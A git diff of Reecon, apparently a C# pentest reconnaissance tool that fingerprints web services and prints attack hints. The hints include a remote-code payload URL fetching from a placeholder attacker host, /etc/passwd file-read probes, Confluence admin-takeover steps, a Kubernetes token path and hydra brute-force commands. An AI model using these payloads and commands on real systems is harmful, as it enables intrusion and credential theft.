                 // Kubernetes
                 if (Headers.Any(x => x.Key.StartsWith("X-Kubernetes-")))
                 {
-                    responseText += "-- " + "Kubernetes Detected".Pastel(Color.Orange) + Environment.NewLine;
+                    Headers.Where(x => !x.Key.StartsWith("X-Kubernetes-"));
+                    toReturn += "-- " + "Kubernetes Detected".Recolor(Color.Orange) + Environment.NewLine;
                     var versionCheck = GetHTTPInfo($"{URL}version");
                     if (versionCheck.StatusCode == HttpStatusCode.OK)
                     {
                         JsonDocument versionData = JsonDocument.Parse(versionCheck.PageText);
                         string major = versionData.RootElement.GetProperty("major").GetString();
                         string minor = versionData.RootElement.GetProperty("minor").GetString();
-                        responseText += "-- " + $"Version: {major}.{minor} (In /version)".Pastel(Color.Orange) + Environment.NewLine;
+                        toReturn += "-- " + $"Version: {major}.{minor} (In /version)".Recolor(Color.Orange) + Environment.NewLine;
                     }
-                    responseText += "--- " + "Try get /run/secrets/kubernetes.io/serviceaccount/token" + Environment.NewLine;
-                    responseText += "--- " + "If you do, read: https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" + Environment.NewLine;
+                    toReturn += "--- " + "Try get /run/secrets/kubernetes.io/serviceaccount/token" + Environment.NewLine;
+                    toReturn += "--- " + "If you do, read: https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" + Environment.NewLine;
 
                 }
 
-                // All the rest
-                if (Headers.Any(x => x.Key.StartsWith("X-")))
+                // Vercel
+                if (Headers.Any(x => x.Key.StartsWith("X-Vercel-Id") || x.Key.StartsWith("X-Vercel-Cache")))
                 {
-                    while (Headers.Any(x => x.Key.StartsWith("X-")))
-                    {
-                        var theHeader = Headers.First(x => x.Key.StartsWith("X-"));
-                        string headerName = theHeader.Key;
-                        if (headerName != "X-Content-Type-Options") // Not really useful
-                        {
-                            string headerValues = string.Join(",", Headers.GetValues(headerName));
-                            responseText += $"- {headerName}: {headerValues}{Environment.NewLine} (Bug Reelix for a useful X- Header)";
-                        }
-                        Headers.Remove(theHeader.Key);
-                    }
+                    toReturn += "-- " + "Vercel Detected".Recolor(Color.Orange) + Environment.NewLine;
+                    Headers.Remove("X-Vercel-Id");
+                    Headers.Remove("X-Vercel-Cache");
+                }
+
+                // Useless ones (For our purposes, anyways)
+                // X-Matched-Path ?
+                Headers.Remove("X-Content-Type-Options");
+                Headers.Remove("X-Frame-Options");
+
+                // All the rest
+                while (Headers.Any(x => x.Key.StartsWith("X-")))
+                {
+                    var theHeader = Headers.First(x => x.Key.StartsWith("X-"));
+                    string headerName = theHeader.Key;
+                    string headerValues = string.Join(",", Headers.GetValues(headerName));
+                    toReturn += $"- {headerName}: {headerValues}" + Environment.NewLine;
+                    toReturn += "-- If you see this, bug Reelix for a useful X- Header" + Environment.NewLine;
+                    Headers.Remove(theHeader.Key);
                 }
 
                 // Requires a login
@@ -1279,7 +1327,7 @@ namespace Reecon
                 {
                     string wwwAuthenticate = Headers.WwwAuthenticate.ToString();
                     Headers.Remove("WWW-Authenticate");
-                    responseText += "- WWW-Authenticate: " + wwwAuthenticate + Environment.NewLine;
+                    toReturn += $"- WWW-Authenticate: {wwwAuthenticate}" + Environment.NewLine;
                 }
 
                 // Kabana
@@ -1287,14 +1335,14 @@ namespace Reecon
                 {
                     string kbnName = Headers.GetValues("kbn-name").First();
                     Headers.Remove("kbn-name");
-                    responseText += "- kbn-name: " + kbnName + Environment.NewLine;
-                    responseText += "-- You should get more kibana-based info further down" + Environment.NewLine;
+                    toReturn += "- kbn-name: " + kbnName + Environment.NewLine;
+                    toReturn += "-- You should get more kibana-based info further down" + Environment.NewLine;
                 }
                 if (Headers.Any(x => x.Key == "kbn-version"))
                 {
                     string kbnVersion = Headers.GetValues("kbn-version").ToString(); // Will this bug since it's not .First() ?
                     Headers.Remove("kbn-version");
-                    responseText += "- kbn-version: " + kbnVersion + Environment.NewLine;
+                    toReturn += $"- kbn-version: {kbnVersion}" + Environment.NewLine;
                 }
 
                 // Useful cookies
@@ -1302,32 +1350,32 @@ namespace Reecon
                 {
                     string setCookie = Headers.GetValues("Set-Cookie").First();
                     Headers.Remove("Set-Cookie");
-                    responseText += "- Set-Cookie: " + setCookie + Environment.NewLine;
+                    toReturn += $"- Set-Cookie: {setCookie}" + Environment.NewLine;
                     // Cacti
                     if (setCookie.StartsWith("Cacti"))
                     {
-                        responseText += "- " + "Cacti detected".Pastel(Color.Orange) + Environment.NewLine;
+                        toReturn += "- " + "Cacti detected".Recolor(Color.Orange) + Environment.NewLine;
                         if (PageText.Contains("Version 1.2.22"))
                         {
-                            responseText += "-- " + "Vulnerable version 1.2.22 detected - CVE-2022-46169" + Environment.NewLine; ;
+                            toReturn += "-- " + "Vulnerable version 1.2.22 detected - CVE-2022-46169" + Environment.NewLine; ;
                         }
                         else
                         {
-                            responseText += "-- Unknown Cacti version - Bug Reelix" + Environment.NewLine;
+                            toReturn += "-- Unknown Cacti version - Bug Reelix" + Environment.NewLine;
                         }
                     }
                     // CuteNews Cookie
                     else if (setCookie.StartsWith("CUTENEWS_SESSION"))
                     {
-                        responseText += "-- " + $"CuteNews Found".Pastel(Color.Orange) + Environment.NewLine;
-                        responseText += $"--- " + $"Browse to {urlWithSlash}CuteNews/index.php".Pastel(Color.Orange) + Environment.NewLine;
+                        toReturn += "-- " + $"CuteNews Found".Recolor(Color.Orange) + Environment.NewLine;
+                        toReturn += $"--- " + $"Browse to {urlWithSlash}CuteNews/index.php".Recolor(Color.Orange) + Environment.NewLine;
                     }
                     // Moodle Cookie
                     else if (setCookie.StartsWith("MoodleSession"))
                     {
-                        responseText += "-- " + $"Moodle Found".Pastel(Color.Orange) + Environment.NewLine;
-                        responseText += $"--- " + $"Browse to {urlWithSlash}lib/upgrade.txt".Pastel(Color.Orange) + Environment.NewLine;
-                        responseText += "--- If 3.9 -> https://www.exploit-db.com/exploits/50180" + Environment.NewLine;
+                        toReturn += "-- " + $"Moodle Found".Recolor(Color.Orange) + Environment.NewLine;
+                        toReturn += $"--- " + $"Browse to {urlWithSlash}lib/upgrade.txt".Recolor(Color.Orange) + Environment.NewLine;
+                        toReturn += "--- If 3.9 -> https://www.exploit-db.com/exploits/50180" + Environment.NewLine;
                     }
                 }
                 // Fun content types
@@ -1341,12 +1389,12 @@ namespace Reecon
                     else if (contentType.StartsWith("image"))
                     {
                         // The entire thing is an image - It's special!
-                        responseText += "- Content Type: " + contentType.Pastel(Color.Orange) + " <--- It's an image!" + Environment.NewLine;
+                        toReturn += "- Content Type: " + contentType.Recolor(Color.Orange) + " <--- It's an image!" + Environment.NewLine;
                     }
                     else
                     {
                         // A unique content type - Might be interesting
-                        responseText += "- Content-Type: " + contentType + Environment.NewLine;
+                        toReturn += $"- Content-Type: {contentType}" + Environment.NewLine;
                     }
                 }
 
@@ -1354,8 +1402,8 @@ namespace Reecon
                 if (Headers.Any(x => x.Key == "Content-Security-Policy"))
                 {
                     string csp = Headers.GetValues("Content-Security-Policy").First();
-                    responseText += "- Content-Security-Policy: " + csp + Environment.NewLine;
-                    responseText += "-- Verify security with: https://csp-evaluator.withgoogle.com/" + Environment.NewLine;
+                    toReturn += "- Content-Security-Policy: " + csp + Environment.NewLine;
+                    toReturn += "-- Verify security with: https://csp-evaluator.withgoogle.com/" + Environment.NewLine;
                 }
 
                 // And the rest
@@ -1365,7 +1413,7 @@ namespace Reecon
                     otherHeaders += header.Key + ",";
                 }
                 otherHeaders = otherHeaders.Trim(',');
-                responseText += "- Other Headers: " + otherHeaders + Environment.NewLine;
+                toReturn += "- Other Headers: " + otherHeaders + Environment.NewLine;
             }
 
             // Page Text (Body)
@@ -1373,7 +1421,7 @@ namespace Reecon
             {
                 if (PageText.Length < 250)
                 {
-                    responseText += "- Page Text: " + PageText.Trim() + Environment.NewLine;
+                    toReturn += "- Page Text: " + PageText.Trim() + Environment.NewLine;
                 }
 
                 // Generic <meta name="generator" 
@@ -1383,28 +1431,38 @@ namespace Reecon
                     contentValue = contentValue.Substring(0, contentValue.IndexOf("\"")).Trim();
                     if (contentValue.StartsWith("concrete5 - "))
                     {
-                        responseText += "- " + "concrete5 CMS detected!".Pastel(Color.Orange) + Environment.NewLine;
+                        toReturn += "- " + "concrete5 CMS detected!".Recolor(Color.Orange) + Environment.NewLine;
                         // <meta name="generator" content="concrete5 - 8.5.2"/>
                         string versionInfo = PageText.Remove(0, PageText.IndexOf("<meta name=\"generator\" content=\"concrete5 - "));
                         versionInfo = versionInfo.Remove(0, versionInfo.IndexOf("concrete5 - ") + 12);
                         versionInfo = versionInfo.Substring(0, versionInfo.IndexOf("\""));
-                        responseText += "-- Version: " + versionInfo + Environment.NewLine;
+                        toReturn += "-- Version: " + versionInfo + Environment.NewLine;
                         if (versionInfo == "8.5.2")
                         {
-                            responseText += "---" + " Vulnerable version detected - Vulnerable to CVE-2020-24986 - https://hackerone.com/reports/768322".Pastel(Color.Orange) + Environment.NewLine;
+                            toReturn += "---" + " Vulnerable version detected - Vulnerable to CVE-2020-24986 - https://hackerone.com/reports/768322".Recolor(Color.Orange) + Environment.NewLine;
                         }
+                    }
+                    else if (contentValue.StartsWith("TYPO3"))
+                    {
+                        toReturn += "- " + "TYPO3 CMS detected!".Recolor(Color.Orange) + Environment.NewLine;
+                        toReturn += "$-- check out /typo3temp, /typo3, and /typo3conf" + Environment.NewLine;
+                        toReturn += $"-- git clone https://github.com/whoot/Typo3Scan && python3 typo3scan.py -d {urlPrefix}" + Environment.NewLine;
+                    }
+                    else if (contentValue.StartsWith("WordPress "))
+                    {
+
                     }
                     else if (!contentValue.StartsWith("WordPress ")) // WordPress is more thoroughly checked further down
                     {
-                        responseText += "- " + (contentValue + " detected!").Pastel(Color.Orange) + Environment.NewLine;
+                        toReturn += "- " + (contentValue + " detected!").Recolor(Color.Orange) + Environment.NewLine;
                     }
                 }
 
                 // Confluence
                 if (PageText.Contains("Printed by Atlassian Confluence") || PageText.Contains("Powered by Atlassian Confluence"))
                 {
-                    responseText += "- " + "Confluence detected!".Pastel(Color.Orange) + Environment.NewLine;
-                    responseText += "-- " + "See if you can access /setup/".Pastel(Color.Orange) + Environment.NewLine; // Maybe automate this?
+                    toReturn += "- " + "Confluence detected!".Recolor(Color.Orange) + Environment.NewLine;
+                    toReturn += "-- " + "See if you can access /setup/".Recolor(Color.Orange) + Environment.NewLine; // Maybe automate this?
                                                                                                                         // Get the version
                     string confluenceVersionText = "";
                     if (PageText.Contains("Printed by Atlassian Confluence "))
@@ -1419,7 +1477,7 @@ namespace Reecon
                         confluenceVersionText = PageText.Remove(0, PageText.IndexOf(footerText) + footerText.Length);
                     }
                     confluenceVersionText = confluenceVersionText.Substring(0, confluenceVersionText.IndexOf("</li>"));
-                    responseText += $"-- Found Version: {confluenceVersionText}" + Environment.NewLine;
+                    toReturn += $"-- Found Version: {confluenceVersionText}" + Environment.NewLine;
                     Version version = Version.Parse(confluenceVersionText);
 
                     // Check the version against some CVE's
@@ -1464,7 +1522,7 @@ namespace Reecon
 
                     if (isVulnerable)
                     {
-                        responseText += "-- " + $"Vulnerable Confluence Version Detected {confluenceVersionText} -> https://github.com/Nwqda/CVE-2022-26134".Pastel(Color.Orange) + Environment.NewLine;
+                        toReturn += "-- " + $"Vulnerable Confluence Version Detected {confluenceVersionText} -> https://github.com/Nwqda/CVE-2022-26134".Recolor(Color.Orange) + Environment.NewLine;
                     }
                     isVulnerable = false;
 
@@ -1498,9 +1556,9 @@ namespace Reecon
                     if (isVulnerable)
                     {
                         // Ref: https://tryhackme.com/room/confluence202322515
-                        responseText += "-- " + $"Vulnerable Confluence Version Detected {confluenceVersionText} (CVE-2022-26134)".Pastel(Color.Orange) + Environment.NewLine;
-                        responseText += "--- " + $"1.) Proceed to {baseURL}/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false".Pastel(Color.Orange) + Environment.NewLine;
-                        responseText += "--- " + $"2.) Proceed to {baseURL}/setup/setupadministrator-start.action and create a new admin user (Choose Different username).".Pastel(Color.Orange) + Environment.NewLine;
+                        toReturn += "-- " + $"Vulnerable Confluence Version Detected {confluenceVersionText} (CVE-2022-26134)".Recolor(Color.Orange) + Environment.NewLine;
+                        toReturn += "--- " + $"1.) Proceed to {baseURL}/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false".Recolor(Color.Orange) + Environment.NewLine;
+                        toReturn += "--- " + $"2.) Proceed to {baseURL}/setup/setupadministrator-start.action and create a new admin user (Choose Different username).".Recolor(Color.Orange) + Environment.NewLine;
                     }
                     isVulnerable = false;
 
@@ -1530,8 +1588,8 @@ namespace Reecon
                     if (isVulnerable)
                     {
                         // Ref: https://tryhackme.com/room/confluence202322515
-                        responseText += "-- " + $"Vulnerable Confluence Version Detected {confluenceVersionText} (CVE-2023-22518)".Pastel(Color.Orange) + Environment.NewLine;
-                        responseText += "--- No PoC yet - Check Github maybe." + Environment.NewLine;
+                        toReturn += "-- " + $"Vulnerable Confluence Version Detected {confluenceVersionText} (CVE-2023-22518)".Recolor(Color.Orange) + Environment.NewLine;
+                        toReturn += "--- No PoC yet - Check Github maybe." + Environment.NewLine;
                     }
 
                 }
@@ -1540,48 +1598,48 @@ namespace Reecon
                 // Cookie Added Name: i_like_gitea
                 if (PageText.Contains("Powered by Gitea"))
                 {
-                    responseText += "- " + "Gitea detected!".Pastel(Color.Orange) + Environment.NewLine;
+                    toReturn += "- " + "Gitea detected!".Recolor(Color.Orange) + Environment.NewLine;
                     if (PageText.ToLower().Contains("appver: '") && PageText.ToLower().Contains("appsuburl: '")) // appUrl
                     {
                         string giteaVersion = PageText.Remove(0, PageText.ToLower().IndexOf("appver: '".ToLower()) + 9);
                         giteaVersion = giteaVersion.Substring(0, giteaVersion.IndexOf("'"));
                         Version theVersion = System.Version.Parse(giteaVersion);
-                        responseText += $"-- Version: {theVersion}".Pastel(Color.White) + Environment.NewLine;
+                        toReturn += $"-- Version: {theVersion}".Recolor(Color.White) + Environment.NewLine;
                         // Version: >= 1.1.0 to <= 1.12.5
                         if (theVersion.Major == 1 && theVersion.Minor <= 12)
                         {
-                            responseText += "-- " + $"Vulnerable Gitea Version Detected {giteaVersion} -> https://www.exploit-db.com/raw/49571".Pastel(Color.Orange) + Environment.NewLine;
+                            toReturn += "-- " + $"Vulnerable Gitea Version Detected {giteaVersion} -> https://www.exploit-db.com/raw/49571".Recolor(Color.Orange) + Environment.NewLine;
                         }
-                        responseText += "-- If you gain access, see if you can alter gitea.db (User table)".Pastel(Color.White) + Environment.NewLine;
+                        toReturn += "-- If you gain access, see if you can alter gitea.db (User table)".Recolor(Color.White) + Environment.NewLine;
                     }
                 }
 
                 // Grafana
                 if (PageText.Contains("Grafana v")) // ,"subTitle":"Grafana v8.3.0 (914fcedb72)"
                 {
-                    responseText += "- " + "Grafana detected!".Pastel(Color.Orange) + Environment.NewLine;
+                    toReturn += "- " + "Grafana detected!".Recolor(Color.Orange) + Environment.NewLine;
                     string grafanaVersion = PageText.Remove(0, PageText.IndexOf("Grafana v") + 8);
                     grafanaVersion = grafanaVersion.Substring(0, grafanaVersion.IndexOf("\""));
-                    responseText += "-- Version: " + grafanaVersion + Environment.NewLine;
+                    toReturn += "-- Version: " + grafanaVersion + Environment.NewLine;
                     if (grafanaVersion.Contains("v8."))
                     {
-                        responseText += "--- " + "Possibly vulnerable to CVE-2021-43798 (Grafana versions 8.0.0-beta1 through 8.3.0)".Pastel(Color.Orange) + Environment.NewLine;
-                        responseText += "--- " + "Exploit: https://github.com/taythebot/CVE-2021-43798" + Environment.NewLine;
+                        toReturn += "--- " + "Possibly vulnerable to CVE-2021-43798 (Grafana versions 8.0.0-beta1 through 8.3.0)".Recolor(Color.Orange) + Environment.NewLine;
+                        toReturn += "--- " + "Exploit: https://github.com/taythebot/CVE-2021-43798" + Environment.NewLine;
                     }
                 }
 
                 // Icecast
                 if (PageText.Trim() == "<b>The source you requested could not be found.</b>")
                 {
-                    responseText += "-- Possible Icecast Server detected" + Environment.NewLine; // Thanks nmap!
-                    responseText += "-- Try: run Metasploit windows/http/icecast_header" + Environment.NewLine;
+                    toReturn += "-- Possible Icecast Server detected" + Environment.NewLine; // Thanks nmap!
+                    toReturn += "-- Try: run Metasploit windows/http/icecast_header" + Environment.NewLine;
                 }
 
                 // Joomla!
                 if (PageText.Contains("com_content") && PageText.Contains("com_users"))
                 {
-                    responseText += "- " + "Joomla! Detected".Pastel(Color.Orange) + Environment.NewLine;
-                    responseText += "- " + $"Brute Force: nmap -p80 -sV --script http-joomla-brute {DNS} --script-args 'userdb=users.txt,passdb=words.txt,http-joomla-brute.uri=/administrator/index.php'".Pastel(Color.Orange);
+                    toReturn += "- " + "Joomla! Detected".Recolor(Color.Orange) + Environment.NewLine;
+                    toReturn += "- " + $"Brute Force: nmap -p80 -sV --script http-joomla-brute {DNS} --script-args 'userdb=users.txt,passdb=words.txt,http-joomla-brute.uri=/administrator/index.php'".Recolor(Color.Orange);
                     var adminXML = GetHTTPInfo($"{URL}administrator/manifests/files/joomla.xml");
                     if (adminXML.StatusCode == HttpStatusCode.OK)
                     {
@@ -1589,7 +1647,7 @@ namespace Reecon
                         {
                             string versionText = adminXML.PageText.Remove(0, adminXML.PageText.IndexOf("<version>") + "<version>".Length);
                             versionText = versionText.Substring(0, versionText.IndexOf("</version"));
-                            responseText += "-- " + "Joomla! Version: {versionText}".Pastel(Color.Orange) + Environment.NewLine;
+                            toReturn += "-- " + "Joomla! Version: {versionText}".Recolor(Color.Orange) + Environment.NewLine;
                             // https://vulncheck.com/blog/joomla-for-rce
                             // - CVE-2023-23752 - 4.0.0 through 4.2.7
                         }
@@ -1601,17 +1659,26 @@ namespace Reecon
                         if (tinyXML.StatusCode == HttpStatusCode.OK)
                         {
                             // https://joomla.stackexchange.com/questions/7148/how-to-get-joomla-version-by-http
-                            responseText += "- TinyMCE use case hit - Bug Reelix to finish this!" + Environment.NewLine;
+                            toReturn += "- TinyMCE use case hit - Bug Reelix to finish this!" + Environment.NewLine;
                         }
                     }
                 }
 
+                // Kibana
+                if (PageText.Contains("kbn-injected-metadata"))
+                {
+                    toReturn += "-- " + "Kibana Detected".Recolor(Color.Orange) + Environment.NewLine;
+                    string versionText = PageText.Remove(0, PageText.IndexOf("&quot;version&quot;:&quot;") + 26);
+                    versionText = versionText.Substring(0, versionText.IndexOf("&quot;"));
+                    toReturn += "--- Version: " + versionText + Environment.NewLine;
+                    toReturn += "---- Kibana versions before 5.6.15 and 6.6.1 -> CVE-2019-7609 -> https://github.com/mpgn/CVE-2019-7609" + Environment.NewLine;
+                }
                 // Wordpress
                 //if (PageText.Contains("/wp-content/themes/") && (PageText.Contains("/wp-includes/") || PageText.Contains("/wp-includes\\")))
                 // Some Wordpress pages don't contain "wp-content" (Ref: HTB Acute)
                 if (PageText.Contains("/wp-includes/") || PageText.Contains("/wp-includes\\"))
                 {
-                    responseText += "- " + "Wordpress detected!".Pastel(Color.Orange) + Environment.NewLine;
+                    toReturn += "- " + "WordPress detected!".Recolor(Color.Orange) + Environment.NewLine;
 
                     // Basic version check
                     if (PageText.Contains("<meta name=\"generator\" content=\"WordPress "))
@@ -1619,7 +1686,7 @@ namespace Reecon
                         string wpVersion = PageText.Remove(0, PageText.IndexOf("<meta name=\"generator\" content=\"WordPress "));
                         wpVersion = wpVersion.Remove(0, wpVersion.IndexOf("WordPress ") + "WordPress ".Length);
                         wpVersion = wpVersion.Substring(0, wpVersion.IndexOf("\"")).Trim();
-                        responseText += "-- Version: " + wpVersion + Environment.NewLine;
+                        toReturn += "-- WordPress Version: " + wpVersion + Environment.NewLine;
                     }
 
                     // Basic User Enumeration - Need to combine these two...
@@ -1635,7 +1702,7 @@ namespace Reecon
                             if (!wpUsers.Contains(wpUserName))
                             {
                                 wpUsers.Add(wpUserSlug);
-                                responseText += "-- " + $"Wordpress User Found: {wpUserName} (Username: {wpUserSlug})".Pastel(Color.Orange) + Environment.NewLine;
+                                toReturn += "-- " + $"Wordpress User Found: {wpUserName} (Username: {wpUserSlug})".Recolor(Color.Orange) + Environment.NewLine;
                             }
                         }
                     }
@@ -1651,51 +1718,61 @@ namespace Reecon
                             if (!wpUsers.Contains(wpUserName))
                             {
                                 wpUsers.Add(wpUserSlug);
-                                responseText += "-- " + $"Wordpress User Found: {wpUserName} (Username: {wpUserSlug})".Pastel(Color.Orange) + Environment.NewLine;
+                                toReturn += "-- " + $"Wordpress User Found: {wpUserName} (Username: {wpUserSlug})".Recolor(Color.Orange) + Environment.NewLine;
                             }
                         }
                     }
 
-                    // Basic vulnerable addons
+                    // List Plugins
                     if (PageText.Contains("/wp-content/plugins/"))
                     {
-                        /*
-                        List<string> pluginList = PageText.Split("/wp-content/plugins/".ToCharArray()).ToList();
+                        List<string> pluginList = PageText.Split(new string[] { "/wp-content/plugins/" }, StringSplitOptions.None).ToList();
+
+                        // If it contains a plugin, then splitting by the plugin string has the first item being the text before it
+
+                        // To Test:
+                        // 2+ Plugins
+                        // See if there is a commonality in the format
+                        if (pluginList.Count >= 2)
+                        {
+                            pluginList.RemoveAt(0);
+                        }
                         foreach (string plugin in pluginList)
                         {
-                            string thePlugin = plugin.Substring(0, plugin.IndexOf("/wp-content/"));
-                            thePlugin = thePlugin.Substring(0, thePlugin.IndexOf(" ") - 1);
-                            Console.WriteLine("-- Found Plugin: " + thePlugin);
+                            // Plugin Found: adrotate/library/jquery.adrotate.clicktracker.js
+                            // /wp-content/plugins/adrotate/readme.txt
+                            string thePlugin = plugin.Substring(0, plugin.IndexOf(" ") - 1);
+                            toReturn += $"-- Plugin Found: {thePlugin}" + Environment.NewLine;
                         }
-                        */
                     }
                     if (PageText.Contains("/wp-with-spritz/"))
                     {
-                        responseText += "-- " + "Vulnerable Plugin Detected".Pastel(Color.Orange) + $" - {urlWithSlash}wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd" + Environment.NewLine;
+                        toReturn += "-- " + "Vulnerable Plugin Detected".Recolor(Color.Orange) + $" - {urlWithSlash}wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd" + Environment.NewLine;
                     }
                     else if (PageText.Contains("/wp-content/plugins/social-warfare"))
                     {
-                        responseText += "-- " + "Possible Vulnerable Plugin Detected (Vuln if <= 3.5.2) - CVE-2019-9978".Pastel(Color.Orange) + $" - {urlWithSlash}wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://yourIPHere:5901/rce.txt" + Environment.NewLine;
-                        responseText += "--- rce.txt: <pre>system('cat /etc/passwd')</pre>" + Environment.NewLine;
-                        responseText += $"--- Verify Version: {urlWithSlash}wp-content/plugins/social-warfare/readme.txt - Scroll down to Changelog" + Environment.NewLine;
+                        toReturn += "-- " + "Possible Vulnerable Plugin Detected (Vuln if <= 3.5.2) - CVE-2019-9978".Recolor(Color.Orange) + $" - {urlWithSlash}wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://yourIPHere:5901/rce.txt" + Environment.NewLine;
+                        toReturn += "--- rce.txt: <pre>system('cat /etc/passwd')</pre>" + Environment.NewLine;
+                        toReturn += $"--- Verify Version: {urlWithSlash}wp-content/plugins/social-warfare/readme.txt - Scroll down to Changelog" + Environment.NewLine;
                     }
 
                     // Check for public folders
                     var contentDir = Web.GetHTTPInfo($"{urlWithSlash}wp-content/");
                     if (contentDir.StatusCode == HttpStatusCode.OK && contentDir.PageText.Length != 0)
                     {
-                        responseText += "-- " + $"{urlWithSlash}wp-content/ is public".Pastel(Color.Orange) + Environment.NewLine;
+                        toReturn += "-- " + $"{urlWithSlash}wp-content/ is public".Recolor(Color.Orange) + Environment.NewLine;
                     }
                     var pluginsDir = Web.GetHTTPInfo($"{urlWithSlash}wp-content/plugins/");
                     if (pluginsDir.StatusCode == HttpStatusCode.OK && pluginsDir.PageText.Length != 0)
                     {
-                        responseText += "-- " + $"{urlWithSlash}wp-content/plugins/ is public".Pastel(Color.Orange) + Environment.NewLine;
+                        toReturn += "-- " + $"{urlWithSlash}wp-content/plugins/ is public".Recolor(Color.Orange) + Environment.NewLine;
                     }
 
-                    responseText += $"-- User Enumeration: wpscan --url {urlWithSlash} --enumerate u1-5" + Environment.NewLine;
-                    responseText += $"-- Plugin Enumeration: wpscan --url {urlWithSlash} --enumerate p" + Environment.NewLine;
-                    responseText += $"-- User + Plugin Enumeration: wpscan --url {urlWithSlash} --enumerate u1-5,p" + Environment.NewLine;
-                    responseText += $"-- Aggressive Plugin Enumeration (Slow): wpscan --url {urlWithSlash} --plugins-detection aggressive" + Environment.NewLine;
+                    // And then return the general wpscan enum info
+                    toReturn += $"-- User Enumeration: wpscan --url {urlWithSlash} --enumerate u1-5" + Environment.NewLine;
+                    toReturn += $"-- Plugin Enumeration: wpscan --url {urlWithSlash} --enumerate p" + Environment.NewLine;
+                    toReturn += $"-- User + Plugin Enumeration: wpscan --url {urlWithSlash} --enumerate u1-5,p" + Environment.NewLine;
+                    toReturn += $"-- Aggressive Plugin Enumeration (Slow): wpscan --url {urlWithSlash} --plugins-detection aggressive" + Environment.NewLine;
 
                     // Checking for wp-login.php
                     var wplogin = GetHTTPInfo($"{baseURL}/wp-login.php");
@@ -1714,18 +1791,18 @@ namespace Reecon
                     var wpdiscuz = GetHTTPInfo($"{urlWithSlash}wp-content/plugins/wpdiscuz/readme.txt");
                     if (wpdiscuz.StatusCode == HttpStatusCode.OK && wpdiscuz.PageText.Contains("wpDiscuz "))
                     {
-                        responseText += "-- wpDiscuz detected - Bug Reelix to update this.".Pastel(Color.Orange) + Environment.NewLine;
-                        responseText += "--- If 7.0.4 -> https://www.exploit-db.com/raw/49967" + Environment.NewLine;
+                        toReturn += "-- wpDiscuz detected - Bug Reelix to update this.".Recolor(Color.Orange) + Environment.NewLine;
+                        toReturn += "--- If 7.0.4 -> https://www.exploit-db.com/raw/49967" + Environment.NewLine;
                     }
 
                     // simple-backup (Vuln plugin)
                     var wpSimpleBackup = GetHTTPInfo($"{urlWithSlash}wp-content/plugins/simple-backup/readme.txt");
                     if (wpSimpleBackup.StatusCode == HttpStatusCode.OK && wpSimpleBackup.PageText.Contains("Name: Simple Backup"))
                     {
-                        responseText += "-- " + "Wordpress Plugin Simple Backup Detected - Bug Reelix to update this.".Pastel(Color.Orange) + Environment.NewLine;
-                        responseText += "--- https://packetstormsecurity.com/files/131919/WordPress-Simple-Backup-Plugin-Arbitrary-Download.html" + Environment.NewLine;
+                        toReturn += "-- " + "Wordpress Plugin Simple Backup Detected - Bug Reelix to update this.".Recolor(Color.Orange) + Environment.NewLine;
+                        toReturn += "--- https://packetstormsecurity.com/files/131919/WordPress-Simple-Backup-Plugin-Arbitrary-Download.html" + Environment.NewLine;
                     }
-                    responseText += $"-- hydra -L users.txt -P passwords.txt {DNS} http-post-form \"{wpLoginPath}:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:The password you entered for the username\" -I -t 50" + Environment.NewLine;
+                    toReturn += $"-- hydra -L users.txt -P passwords.txt {DNS} http-post-form \"{wpLoginPath}:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:The password you entered for the username\" -I -t 50" + Environment.NewLine;
                 }
             }
 
@@ -1736,8 +1813,8 @@ namespace Reecon
                 string certIssuer = theCert.Issuer;
                 string certSubject = theCert.Subject;
                 // string certAltName = SSLCert.SubjectName.Name;
-                responseText += "- SSL Cert Issuer: " + certIssuer + Environment.NewLine;
-                responseText += "- SSL Cert Subject: " + certSubject + Environment.NewLine;
+                toReturn += "- SSL Cert Issuer: " + certIssuer + Environment.NewLine;
+                toReturn += "- SSL Cert Subject: " + certSubject + Environment.NewLine;
                 if (theCert.Extensions != null)
                 {
                     // Console.WriteLine("Extensions is not null");
@@ -1769,16 +1846,16 @@ namespace Reecon
                                 }
                             }
                             itemList = itemList.Trim(',');
-                            responseText += "- Subject Alternative Name: " + itemList + Environment.NewLine;
+                            toReturn += "- Subject Alternative Name: " + itemList + Environment.NewLine;
                         }
                     }
                 }
             }
 
             // Clean off any redundant newlines
-            responseText = responseText.TrimEnd(Environment.NewLine.ToCharArray());
+            toReturn = toReturn.TrimEnd(Environment.NewLine.ToCharArray());
 
-            return responseText;
+            return toReturn;
         }
 
         public static string TestBaseLFI(string ip, int port)
@@ -1815,7 +1892,10 @@ namespace Reecon
             catch (Exception ex)
             {
                 // Nope
-                Console.WriteLine("In nope with: " + ex.Message);
+                if (ex.Message != "The SSL connection could not be established, see inner exception.")
+                {
+                    Console.WriteLine("In nope with: " + ex.Message);
+                }
                 // This sometimes reaches here on actual https sites - Need to investigate...
                 // Either a non-accessable HEAD request or an invalid SSL Cert (Doesn't my Web class handle that... ?)
                 return false;
